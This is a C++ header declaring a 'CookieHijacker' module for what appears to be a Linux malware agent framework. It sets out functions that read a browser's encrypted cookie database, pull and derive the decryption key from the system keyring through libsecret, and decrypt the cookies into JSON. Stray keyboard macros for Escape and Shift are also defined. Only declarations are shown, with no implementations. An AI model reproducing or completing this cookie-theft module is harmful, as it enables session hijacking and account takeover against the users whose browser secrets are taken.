#include "../Agent/BaseModule.h"
#include <libsecret/secret.h>


#define UK "UNKNOWN"
#define ESCAPE(key) (key == KEY_ESC)
#define SHIFT(key)  ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))

using cookie_vector_t = std::vector<std::tuple<std::string, std::string, std::vector<unsigned char>, std::string>>;

class CookieHijacker : public BaseModule
{
private:
    std::list<std::string> name_values_;

    void module_impl() override;
    cookie_vector_t get_encrypted_cookies_vector(std::string db_path);
    std::string decryptCookie(std::vector<unsigned char> ciphertext, std::string encryptionKey);
    nlohmann::json decrypt_cookies(cookie_vector_t* cookie_vector);
    std::string AES_Decrypt_String(std::string const& data, std::string const& key, std::vector<unsigned char> const& iVec);
    void Append(GHashTable* attrs_, const std::string& name, const std::string& value);
    SecretValue* ToSingleSecret(GList* secret_items);
    std::string get_key();
    std::string derive_key(std::string pwd);

public:
    CookieHijacker() = delete;
    CookieHijacker(const CookieHijacker &) = delete;

    CookieHijacker(std::string mtype, const json & module_args) : BaseModule(mtype, module_args) 
    {
        std::cout << module_args.dump() << std::endl;
    };

    ~CookieHijacker();
};
